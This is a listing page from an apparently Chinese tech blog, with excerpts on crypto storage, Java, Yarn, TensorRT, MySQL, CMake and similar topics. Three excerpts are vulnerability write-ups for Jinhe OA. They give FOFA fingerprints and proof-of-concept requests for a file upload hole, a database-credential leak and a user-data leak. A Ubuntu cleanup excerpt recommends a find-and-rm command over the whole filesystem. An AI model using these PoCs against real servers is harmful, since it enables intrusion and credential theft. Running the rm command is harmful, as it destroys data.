	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8f67d37d4726795b887b6cf442eaf213/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/824ef778b41f0c1094e8eb4a54ce32ef/" rel="bookmark">
			CESS 的 2023：创新去中心化云存储与 CDN，建设数据价值网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2023 年对于整个加密货币市场和 Web3 行业生态来说是充满挑战和变革的一年，市场结构正在发生重大变化，例如比特币 ETF 的通过把巨量传统资金持续引入 Web3，Tether 重新确立了稳定币的主导地位，CME（芝加哥商品交易所） 期货交易量一度超越币安，以及期权市场的显着增长等等。2023 Yearly On-chain Review 的数据报告长期持有者持有的比特币供应量几乎达到历史最高水平，并且绝大多数比特币现在都处于盈利状态。Friend Tech 利用“粉丝经济”创造去中心化社交新玩法，铭文赛道掀起热潮，比特币生态的再度爆发......漫长的熊市进入尾声，任何一个新玩法、新元素都可能成为牛市的引爆点。
正如黑暗中的曙光即将来临，2023 也孕育了坚持、创新和耕耘。在这个充满变数的年份里，CESS（Cumulus Encrypted Storage System）展示了在 DePIN 赛道下建设去中心化云存储和 CDN 的坚定力量和创新精神。2023 年结束在即，我们将与大家一同回顾 CESS 这一年的旅程——CESS 积极参与全球的专业论坛和行业会议，与当地社区积极交流，推动全球社区的建设和扩张，致力为行业提供可用的去中心化存储和 CDN 基础设施；CESS 支持数据在线存储和实时共享，实现了大规模商用存储，为 Web3 高频动态数据的存储和检索提供全栈解决方案。通过 2023 年内技术的深入探索和建设，CESS 实现了一个又一个里程碑。
在本篇回顾中，让我们一起探索 CESS 如何在不确定性中找到创新的方向，在深熊市场中坚定技术的力量，实现数据价值化和数据价值自由流通/共享，确保数据主权和用户隐私，建设一个开发者，创作者，商家，平台，消费者共同参与的数据价值网络。
官宣 A 轮融资完成总额 800 万美金 12 月 29 日，年末辞旧迎新之际，CESS 正式官宣 A 轮融资已成功完成，融资总额高达 800 万美元。本轮融资由 HTX Venture, Infinity Ventures Crypto, DWF Labs, Mentha Partners, Vespertine Capital, IGG Capital, Singchain Investment, 7 O'Clock Capital, SolrDAO, FishDAO, 和 Winkrypto 等知名投资机构共同参与。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/824ef778b41f0c1094e8eb4a54ce32ef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a24ccc30b204b30ce7f25634b9da8cd/" rel="bookmark">
			金和OA upload_json.asp存在任意文件上传漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		产品简介 金和网络是专业信息化服务商，为城市监管部门提供了互联网+监管解决方案，为企事业单位提供组织协同OA系统升开发平台，电子政务一体化平台智慧电商平合等服务
漏洞概述 金和OA upload_json.asp存在任意文件上传漏洞，攻击者可通过此漏洞获取服务器权限。
指纹识别 fofa:
app="金和网络-金和OA" 漏洞利用 poc:
POST /c6/KindEditor1/asp/upload_json.asp?dir=file HTTP/1.1 Host: your_ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0 Content-Length: 338 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Type: multipart/form-data; boundary=---------------------------153857212076213662067051609723 -----------------------------153857212076213662067051609723 Content-Disposition: form-data; name="localUrl" -----------------------------153857212076213662067051609723 Content-Disposition: form-data; name="imgFile"; filename="hhh.txt" Content-Type: image/png hhh -----------------------------153857212076213662067051609723-- 访问返回包给的url
/c6/KindEditor1/asp/../attached/file/20240103/20240103164534323432.txt 修复建议 更新至最新安全版本
【红豆生南国，春来发枝冬凋敝，相思不如不相思。】
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98d78f8a1d62d0399066c89de48e1f96/" rel="bookmark">
			Halcon顶帽运算与底帽运算的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Halcon顶帽运算与底帽运算的应用 文章目录 Halcon顶帽运算与底帽运算的应用1. 提取小的物件2. 校正非均匀光照 正如上文所说的，顶帽运算返回的像素部分是尺寸比结构元素小的，并且比较亮的局部小区域；底帽运算返回的像素部分是尺寸比结构元素小的，并且比较暗的局部小区域。因此，根据这些特性可以得出，顶帽运算与底帽运算适合一些前景目标比较小或者背景面积比较大的，需要根据灰度进行分割的应用场景。 1. 提取小的物件 因为顶帽运算与底帽运算都是提取比结构元素小的局部区域，因此对于一些暗背景的、目标尺寸又比较小的目标检测场景，可以通过顶帽操作，使用比较大的结构元素来提取目标。底帽运算与
顶帽运算常用于提取图中较亮的小区域，但也适用于大面积的背景的提取。
2. 校正非均匀光照 对于一些背景光照不均匀的情况，如果背景比较大，检测物体比较小，可以使用大的结构元素进行顶帽或者底帽操作，以提取物体背景，并将背景光照变得均匀。图（a）所示为原始的灰度图像，图（b）为经底帽运算得到的较暗的目标区域，图（c）将底帽运算的结果从原图中提取出来，去除了光照不均匀的背景。
图中的底帽运算处理代码如下：
*读取一幅光照不均匀的亮背景图像，这里选取的是一幅彩色图像 read_image (Image,'data/shapes') *变换之前转为灰度图像 rgbl_to_gray (Image, GrayImage) *将图像通过阈值处理转化为二值化图像 threshold (GrayImage, Regions, 145, 255) *创建一个结构元素，这里创建的是一个圆形 gen_circle(StructElement,10,10,100) *清空窗口便于显示结果 dev_clear_window () *进行底帽操作，提取出较暗区域 bottom_hat (Regions, StructElement, RegionBottomHat) *将较暗区域从原图中提取出来 reduce_domain (Image, RegionBottomHat, ImageReduced) dev_clear_window () dev_display (ImageReduced) 在对图像进行阈值处理时需注意，由于使用底帽运算提取的是比较暗的区域，因此这里二值化操作选取的是比较亮的背景区域。圆形结构元素的坐标不受影响，但其半径应根据暗的前景目标进行推算，使其直径至少要能够覆盖待检测的较暗目标。
通过底帽运算将较暗区域从原图中提取出来以后，可以看到不均匀的背景已被去除。
总体来说，顶帽运算适合在较暗的背景下提取比较小且比较亮的前景目标，而底帽运算则相反，
适合在较亮的背景上提取出较暗的目标。两种方法提取的目标都需要小于结构元素的尺寸。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b5de910f454ebe71a063e561d3422a6/" rel="bookmark">
			金和OA SAP_B1Config.aspx存在未授权访问漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		产品简介 金和网络是专业信息化服务商，为城市监管部门提供了互联网+监管解决方案，为企事业单位提供组织协同OA系统升开发平台，电子政务一体化平台智慧电商平合等服务
漏洞概述 金和OA SAP_B1Config.aspx存在未授权访问漏洞，攻击者可通过此漏洞获取数据库的账户密码等敏感信息。
指纹识别 fofa:
app="金和网络-金和OA" 漏洞利用 poc:
/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1 泄露数据库的连接账户和密码
修复建议 联系软件厂商更新至最新安全版本
【有些话可以不说透，自欺欺人，就可以糊涂一世，打打闹闹轻轻松松。】
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc51a0b72c105d39ae0e2444703f7359/" rel="bookmark">
			【Java】接口和抽象类有什么共同点和区别？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人简介：Java领域新星创作者；阿里云技术博主、星级博主、专家博主；正在Java学习的路上摸爬滚打，记录学习的过程~
个人主页：.29.的博客
学习社区：进去逛一逛~
【Java】接口和抽象类有什么共同点和区别？ 比较：接口和抽象类🚀共同点🚀区别 比较：接口和抽象类 🚀共同点 共同点：
抽象性： 接口和抽象类都是用于表示抽象类型，不能被实例化，需要子类来实现或继承 。包含抽象方法： 接口和抽象类都可以包含抽象方法 ，这些方法在子类中需要被具体实现。支持多态： 通过接口或抽象类，可以实现多态性 ，即通过统一的接口或抽象类类型引用不同的实现类对象。都可以有默认实现的方法： Java 8 可以用 default 关键字在接口中定义默认方法 在 Java 8 及以后的版本中，引入了默认方法（Default Methods） 的概念，允许在接口中使用 default 关键字为接口方法提供默认的实现。这样可以在不破坏现有代码的基础上向接口中添加新的方法，而不需要修改所有实现该接口的类。同样，抽象类也可以拥有具有默认实现的方法。
下面是一个简单的例子，演示了在接口和抽象类中使用 default 关键字声明默认实现的方法：
在这个例子中，MyInterface 接口和 MyAbstractClass 抽象类
都定义了一个抽象方法 abstractMethod 和一个默认方法 defaultMethod。
然后，MyClass 类实现了这个接口并继承了抽象类，实现了抽象方法，并且可以选择是否重写默认方法。
在 main 方法中，创建了 MyClass 的实例，并调用了抽象方法和默认方法，展示了默认方法的使用。
// 接口 interface MyInterface { // 抽象方法 void abstractMethod(); // 默认方法 default void defaultMethod() { System.out.println("This is a default implementation of MyInterface."); } } // 抽象类 abstract class MyAbstractClass { // 抽象方法 abstract void abstractMethod(); // 默认方法 default void defaultMethod() { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc51a0b72c105d39ae0e2444703f7359/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/355a8bba1d63f885900f0afbe6e682aa/" rel="bookmark">
			Yarn的安装与使用详细介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是yarn
Apache Hadoop YARN （Yet Another Resource Negotiator，另一种资源协调者）是一种新的 Hadoop 资源管理器，它是一个通用资源管理系统，可为上层应用提供统一的资源管理和调度，它的引入为集群在利用率、资源统一管理和数据共享等方面带来了巨大好处。
快速安装
1、Macos安装
curl -o- -L https://yarnpkg.com/install.sh | bash 2、Linux安装
# 以Ubunto为例 sudo apt-key adv --keyserver pgp.mit.edu --recv D101F7899D41F3C3 echo "deb http://dl.yarnpkg.com/debian/ stable main" | sudo tee /etc/apt/sources.list.d/yarn.list sudo apt-get update &amp;&amp; sudo apt-get install yarn # centos安装 curl -sL https://dl.yarnpkg.com/rpm/yarn.repo -o /etc/yum.repos.d/yarn.repo yum install yarn 3、Windows安装
# windows 下需要下载msi文件 ，下载地址：https://yarnpkg.com/latest.msi npm install -g yarn # 查看版本 yarn --version 如何使用
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/355a8bba1d63f885900f0afbe6e682aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e430cf05b082729af23324baf35f861/" rel="bookmark">
			金和OA UserWebControl.UserSelect.ashx 信息泄露漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		产品简介 金和网络是专业信息化服务商，为城市监管部门提供了互联网+监管解决方案，为企事业单位提供组织协同OA系统升开发平台，电子政务一体化平台智慧电商平合等服务
漏洞概述 金和OA UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx 信息泄露,攻击者可通过此漏洞获取敏感信息。
指纹识别 fofa:
app="金和网络-金和OA" 漏洞利用 poc:
POST /C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&amp;_session=no HTTP/1.1 Host: your_ip User-Agent: Mozilla/5.0 Content-Length: 101 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Connection: close Content-Type: text/plain;charset=UTF-8 strDeptID= strUserId=Admin strUserEsp= strArchivesId= deptIds= IsShowChildrenDept=0 IsCascade=1 泄露userid和用户名
修复建议 联系软件厂商更新至最新安全版本
【读死书，当然百无一用是书生，读活了，才算万般皆下品唯有读书高呀。】
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81fb8b0b1288b7177b2f523103407412/" rel="bookmark">
			安装tensorrt环境在linux上
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在linux上输入命令
bash
cat /etc/os-release
命令查看系统版本
nvidia-smi命令后有内容弹出而没有报错,表明系统中安装了NVIDIA显卡驱动，并且该命令成功地显示了有关NVIDIA GPU的信息。
输入nvcc -V并且看到输出时,这表明您的系统中已经安装了NVIDIA的CUDA工具包，并且该命令成功地显示了CUDA编译器版本的信息
这里是租的ubuntu远程服务器gpu版本，所以nvidia的驱动和cuda都是安装上了。
输入which nvcc 或 where nvcc即可查看cuda的安装路径
可以看到cuda的安装路径是在/usr/local/cuda/bin/nvcc的路径下
除了cuda还需要cudnn
输入指令查看是否存在cudnn
cat /usr/local/cuda/include/cudnn_version.h | grep CUDNN_MAJOR -A 2
弹出以上内容说明cudnn是存在的，这样安装tensorrt的前置工作就完成了，接下来我们进行tensorrt的安装。
这里直接安装tensorrt相对应的版本即可，在官网地址下载：
Log in | NVIDIA Developer
我这里直接下载linux版本 不去区分ubuntu还是centos了，选择
TensorRT 8.6 EA for Linux x86_64 and CUDA 11.0, 11.1, 11.2, 11.3, 11.4, 11.5, 11.6, 11.7 and 11.8 TAR Package 基本可以支持所有的cuda11了。
安装包下载好后之间拖到服务器上。我这里的路径直接拖到/usr/local的路径下。
安装包拖过去后，输入命令完成解压。
tar -xvf /usr/local/TensorRT-8.6.0.12.Linux.x86_64-gnu.cuda-11.8.tar.gz
完成解压，如果没有权限 就在最前面加上sudo
开始解压
因为我们当前路径是在root下，所以解压的文件在root文件夹下
然后我们开始添加环境路径
export LD_LIBRARY_PATH=/root/TensorRT-8.6.0.12/targets/x86_64-linux-gnu/lib:$LD_LIBRARY_PATH
输入echo $LD_LIBRARY_PATH 查看环境路径
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81fb8b0b1288b7177b2f523103407412/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33195bcab6aeca1f5fc49782ae0dc866/" rel="bookmark">
			MySQL 日期比较
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL日期格式比较常用的两个函数是DATEDIFF()和TIMESTAMPDIFF()。
DATEDIFF SELECT DATEDIFF('2023-12-31 23:59:59', '2023-12-30'); # 1 SELECT DATEDIFF('2023-11-30 23:59:59', '2023-12-31'); # -31 第一个参数减去第二个参数得到的天数。
TIMESTAMPDIFF SELECT TIMESTAMPDIFF(MONTH,'2023-02-01','2023-05-01'); # 3 SELECT TIMESTAMPDIFF(MONTH,'2023-05-01','2023-02-01'); # -3 SELECT TIMESTAMPDIFF(YEAR,'2023-01-01','2024-05-01'); # 1 SELECT TIMESTAMPDIFF(MINUTE,'2023-02-01','2023-05-01 12:05:55'); # 128885 第三个参数减去第二个参数得到的对应日期类型数量，第一个参数是日期类型包括：
MICROSECOND (microseconds), SECOND, MINUTE, HOUR, DAY, WEEK, MONTH, QUARTER, 和 YEAR。
参考 datediff
timestampdiff
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddc884d3365f9c0e0846410424e39b6e/" rel="bookmark">
			Swagger 教程：从零开始学习Swagger
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Swagger 是一个开源的 API 设计和文档工具，可以帮助全栈工程师更快、更简单地设计、构建、文档化和测试 RESTful API。本篇文章将为全栈工程师介绍 Swagger 的基础知识和使用方法，以及如何使用 Swagger 设计、文档化和测试 RESTful API。
一、Swagger 简介 Swagger 是一个开源的 API 设计和文档工具，由 Tony Tam 创建于 2010 年。Swagger 提供了一种简单、易于使用的方式来设计、构建、文档化和测试 RESTful API。Swagger 可以自动生成交互式 API 文档、客户端 SDK、服务器 stub 代码等，从而使开发人员更容易地开发、测试和部署 API。
Swagger 的主要组成部分包括：
OpenAPI 规范：Swagger 采用 OpenAPI 规范（前身是 Swagger 规范），用于定义和描述 RESTful API。OpenAPI 规范使用 JSON 或 YAML 格式编写，包含 API 的基本信息、端点、参数、请求和响应等信息。Swagger Codegen：Swagger Codegen 是一个代码生成器，可以从 OpenAPI 规范自动生成客户端 SDK 和服务器 stub 代码。Swagger UI：Swagger UI 是一个基于 HTML、CSS 和 JavaScript 的可交互的 API 文档界面。Swagger UI 可以自动生成 API 文档，让用户可以轻松地浏览、理解和测试 API。 二、Swagger 的使用 安装和配置 Swagger Swagger 可以在许多编程语言和框架中使用，例如 Java、Python、Node.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ddc884d3365f9c0e0846410424e39b6e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58739963b18c63f5c0732cbe0755edc5/" rel="bookmark">
			【性能测试入门必看】性能测试流程简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		性能测试流程介绍： 一、性能测试流程（一）——问清性能测试需求 1、新系统能力验证
2、明确客户需求
3、找出系统性能瓶颈
4、稳定性验证（强度测试）
二、性能测试流程（二）——了解系统结构 系统架构对于测试新手来是最难的；先来了解系统所使用的技术和框架，在环境搭建阶段，你需要了解项目的部署；在性能分析与调优阶段，更要深入这些技术的细节去分析。
1、表示层
表示层（浏览器）通过前端技术（HTML5/JavaScript/CSS3）将系统功能和数据展示给用户，并与用户实现交互。通过TCP/HTTP协议与业务层系统通信，向应用层系统发送请求报文，并接收应用层系统返
回的响应报文。
2、业务逻辑层
业务逻辑层作为中间层实现核心业务逻辑服务。应用服务器主要运行中间件系统，中间件系统系统作为一个容器来运行各种应用软件系统。前台发来的请求报文通过中间件传递给应用程序，应用程序在处理的过程中调用数据层的数据服务器，数据服务器将查询的数据返回给应用程序，应用软件处理完成后通过中间件系统返回给客户端。在大型的系统中，可以对应用系统进行拆分，比如拆分成交易服务，查询服务；或者通过负载均衡技术，来分散客户端发来的请求，使其能承受更大的用户访问量。
3、数据层
数据层运行在数据库主机上，负责整个系统中数据信息的存储。运行数据库服务程序，查询通过JDBC与应用程序进行通信，主要用于存储数据与提供数据查询等服务。数据库集群技术就是对大型系统应用非常广泛的一种解决方案。
三、性能测试流程（三）——分析测试点 性能测试点的选取 (1) 发生频率高的
(2) 关键程度高的
(3) 占用资源非常严重的
对性能需求点的描述 (1) 准确
(2) 一致
(3) 特定
一般性能需求描述 四、性能测试流程（四）——测试工具选取（LoadRunner、Jmeter等，详细介绍略） 五、性能测试流程（五）——测试计划 1．简介
项目的背景，进行此次性能测试的原因，以及性能测试覆盖的范围等，几乎所有项目文档都在开端对项目进行简单的阐述。
2、性能测试需求
寻找被测试的对象和压力点，被测的系统应该是最重要的最基本的功能，也是用户使用最频繁的功能
3、测试环境
(1) 软件环境
(2) 硬件环境
(3) 网络环境
4、数据准备
5、测试工具
6、测试策略
7、人力与时间的安排
六、性能测试流程（六）——测试环境搭建 1、性能测试环境与功能测试环境的区别
性能测试环境与功能测试环境有所不同，对于一些企业为了节约资源，进行功能测试的测试环境，一台服务器可以运行多个系统，通过技术手段可以使系统之间是不会相互影响的（以前公司就是一台服
务器上跑多个tomcat）。 性能测试是要对整个系统运行的软件硬件环境进行测试的，如果某环境下运行多个系统，就很难判断其中的某个环境对资源的占用情况。
2、保证测试环境与生产环境的一致性
(1) 硬件环境：包括服务器环境、网络环境。
(2) 软件环境：版本一致性、配置一致性
(3) 使用场景的一致性：基础数据的一致性、使用模式的一致性。
3、实施策略
七、性能测试流程（七）——测试执行 1．准备测试数据
2．使用测试工具模拟测试点
3．根据测试策略使用不同的虚拟用户和测试组合运行测试
4．监控系统CPU、内存、中间件、数据库的性能、手机数据
5．重复3和4步。
八、性能测试流程（八）——新能调优（此步为后期工作，要求较高、难度较大，粗略介绍） 一般系统的瓶颈 (1) 硬件上的性能瓶颈
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/58739963b18c63f5c0732cbe0755edc5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a277b96e26ed5cd02ae14ebf115cf09/" rel="bookmark">
			linux 内核链表操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		操作系统内核, 如同其他程序, 常常需要维护数据结构的列表. 有时, Linux 内核已经同
时有几个列表实现. 为减少复制代码的数量, 内核开发者已经创建了一个标准环形的, 双
链表; 鼓励需要操作列表的人使用这个设施.
当使用链表接口时, 你应当一直记住列表函数不做加锁. 如果你的驱动可能试图对同一个
列表并发操作, 你有责任实现一个加锁方案. 可选项( 破坏的列表结构, 数据丢失, 内核
崩溃) 肯定是难以诊断的.
为使用列表机制, 你的驱动必须包含文件 &lt;linux/list.h&gt;. 这个文件定义了一个简单的
类型 list_head 结构:
struct list_head { struct list_head *next, *prev; };
真实代码中使用的链表几乎是不变地由几个结构类型组成, 每一个描述一个链表中的入口
项. 为在你的代码中使用 Linux 列表, 你只需要嵌入一个 list_head 在构成这个链表的
结构里面. 假设, 如果你的驱动维护一个列表, 它的声明可能看起来象这样:
struct todo_struct
{
struct list_head list;
int priority; /* driver specific */
/* ... add other driver-specific fields */
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a277b96e26ed5cd02ae14ebf115cf09/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acbce9d26b6e0cf1f85f66ab68299d71/" rel="bookmark">
			ubuntu清理存储空间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在Ubuntu上，你可以采取一些步骤来清理存储空间。以下是一些建议： 清理临时文件： 使用sudo apt-get clean命令来清理APT软件包管理器的下载缓存。 使用sudo apt-get autoremove命令来移除不再需要的软件包。 清理系统日志： 使用sudo journalctl --vacuum-size=100M来清理系统日志。 清理不必要的文件： 查找并删除大文件或不再需要的文件，可以使用find命令。例如，find / -type f -size +100M -exec rm -f {} +可以删除大于100兆字节的文件。 清理浏览器缓存： 清理浏览器缓存，可以通过浏览器设置中的“清理浏览数据”来实现。 清理旧内核： 使用sudo apt-get purge命令移除旧的内核，可以使用dpkg -l | grep linux-image来列出已安装的内核。 删除不再需要的软件： 通过sudo apt-get purge命令彻底删除不再需要的软件。 清理回收站： 清空用户的回收站。 查找并删除大文件： 使用du和find命令来查找并删除大文件。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd94799a39a39847e2e8ab7b03cea24c/" rel="bookmark">
			CMake支持的编译平台和IDE
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		😈「CSDN主页」：传送门
😈「Bilibil首页」：传送门
😈「本文的内容」：CMake入门教程
😈「动动你的小手」：点赞👍收藏⭐️评论📝
文章目录 简介支持的IDEVisual Studio支持示例 其他编译器和生成器支持MinGW示例 IDE集成Eclipse示例 实验性和特殊平台支持总结 简介 CMake是一个非常强大的跨平台自动化构建工具，它支持生成多种类型的项目文件，覆盖了广泛的开发环境和编译器。在这篇博客中，我们将深入探讨CMake支持的各种平台和配置文件类型，以及它们在实际开发中的应用。
我们来看看支持哪些编译器
CMake 生成选项 Visual Studio NMake Makefiles MinGW Makefiles Unix Makefiles Ninja 其他选项 Visual Studio 17 2022 Visual Studio 16 2019 Visual Studio 15 2017 Visual Studio 14 2015 Visual Studio 12 2013 Visual Studio 11 2012 Visual Studio 10 2010 Visual Studio 9 2008 使用 -A 配置架构 使用 -A 配置架构 可选 Win64 或 ARM 可选 Win64 或 ARM 可选 Win64 或 ARM 可选 Win64 或 ARM 可选 Win64 或 IA64 可选 Win64 或 IA64 CodeBlocks Eclipse CDT4 Kate Sublime Text 2 Green Hills MULTI Borland Makefiles MSYS Makefiles NMake Makefiles JOM Ninja Multi-Config Watcom WMake CodeLite 支持的IDE 找了部分图标，偷个懒
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd94799a39a39847e2e8ab7b03cea24c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/717a07386addd46950561225eeffb5f1/" rel="bookmark">
			机器学习中的监督学习基本算法-支持向量机简单介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单的介绍一些关于支持向量机的概念和内容
支持向量机（Support Vector Machine，SVM）是一种用于分类和回归的监督学习模型。SVM 的目标是在特征空间中找到一个超平面，该超平面可以将不同类别的样本分开，并在所有可能的超平面中选择具有最大间隔（margin）的超平面。以下是支持向量机的一些关键概念和特点：
超平面： 在二维空间中，超平面是一条直线；在三维空间中，它是一个平面；在更高维的空间中，它是一个超平面。SVM 的目标是找到一个超平面，使得在这个超平面上附近的样本点到该超平面的距离尽可能远。
间隔（Margin）： 间隔是指离超平面最近的样本点到超平面的距离。SVM 的优化目标是寻找最大化间隔的超平面，即最大化支持向量到超平面的距离。
支持向量： 支持向量是离超平面最近的样本点，这些点对于确定超平面的位置至关重要。它们决定了间隔的大小和方向。
核函数： 在实际问题中，数据可能不是线性可分的。为了处理非线性问题，SVM 引入了核函数，将输入特征映射到高维空间。常用的核函数包括线性核、多项式核、径向基函数（RBF）核等。
软间隔和硬间隔： 在实际应用中，数据可能不是完全线性可分的，或者存在噪声。软间隔 SVM 允许一些样本点位于间隔内，引入了松弛变量，从而可以处理一定程度上的不可分和噪声。
C 参数： C 是一个调整间隔和误分类点惩罚的参数。较小的 C 值会导致更大的间隔，但可能容忍更多的误分类；较大的 C 值会导致更小的间隔，对误分类点的惩罚更重。
应用领域： SVM 在文本分类、图像识别、生物信息学、医学诊断等多个领域取得了良好的效果。
优点：
在高维空间中表现良好，适用于高维数据。
在特征维度大于样本数量时依然有效。
可以通过选择不同的核函数适应不同类型的数据。
缺点：
对大规模数据集和特征数量敏感。
对参数的选择和核函数的选择较为敏感。
训练时间可能较长。
支持向量机是一种强大的机器学习算法，适用于许多不同类型的问题。在实际应用中，需要根据具体问题和数据的性质进行合适的参数选择和调整。
后续在详细的介绍支持向量机，此处不在给出详细的讲解和代码介绍。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a10300328e25022eae7976bb35df7eec/" rel="bookmark">
			JavaSE学习笔记 2023-12-26 --枚举和注释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二十二、枚举和注释 « 上一篇
个人整理非商业用途，欢迎探讨与指正！！
文章目录 二十二、枚举和注释22.1枚举22.2注解 22.1枚举 接口/类中的静态属性
以内部类的形式使用较多
public enum Color { RED,GREEN,YELLOW } class Test01 { public static void main(String[] args) { Color c = Color.RED; switch(c) { case RED: System.out.println("红色的."); break; case GREEN: System.out.println("绿色的"); break; case YELLOW: System.out.println("黄色的"); break; } } } public class User { public static void main(String[] args) { User user = new User(); user.setGender(Gender.BOY); user.setRole(Role.ADMIN); System.out.println(user); } private int userId; private String username; private String password; private Gender gender; private Role role; //	内部枚举类型就是为gender赋值的 private enum Gender {GIRL,BOY} //	role赋值的 private enum Role {ADMIN,NORMAL,SUPERADMIN,QISHOU} .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a10300328e25022eae7976bb35df7eec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac58e594584ed29f41f46975c069dafb/" rel="bookmark">
			vba之与excel司龄计算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、其实很简单：
1、计算工龄
"M2"为单元格的工龄日期。
=CEILING(DATEDIF(M2,NOW(),"M")/12,0.5)
2、工龄分段公式
=LOOKUP(L156,{0,5,10,15,20,25;"5年以下","5~10年","10~15年","15年~20年","20~25年","25年以上"})
二、适用VBA实现
Sub 插入新列并计算司龄() Dim ws As Worksheet Dim lastRow As Long Dim i As Long Dim entryDate As Date Dim yearsOfService As Double ' 指定要操作的工作表 Set ws = ThisWorkbook.Sheets("测试") '！！！！！！！！必须为此表名 If IsError(Application.Match("司龄", ws.Rows(1), 0)) Then ' 在最后一列右侧插入两个新列 ws.Cells(1, ws.Cells(1, ws.Columns.Count).End(xlToLeft).Column + 1).Value = "司龄" ws.Cells(1, ws.Cells(1, ws.Columns.Count).End(xlToLeft).Column + 1).Value = "司龄分段" End If Dim sllb As Variant Dim slfd As Variant Dim sl_start As Variant sllb = Application.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac58e594584ed29f41f46975c069dafb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5320d6301a4b86a71712bc69a60db7b/" rel="bookmark">
			关于系统设计的一些思考
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0.前言 当我们站在系统设计的起点，面对一个新的需求，我们该如何开始呢？这是许多处于系统分析与设计领域的新手常常思考的问题。有些人可能会误以为，只要掌握了诸如面向对象、统一建模语言、设计模式、微服务、Serverless、ServiceMesh 、DDD 这样的标准方法论或新潮或深奥的理论，就能顺利地进行设计了。然而，经过实践我们会发现很多系统设计都是要对具体情况进行详细的权衡分析。我要说，虽然这些工具、方法、技能很重要，但它们绝不是成为优秀设计师的充分或是必要条件。无数的实践告诉我，没有捷径可走，唯有在实践中不断地学习、总结、反思，我们才能真正地成长。
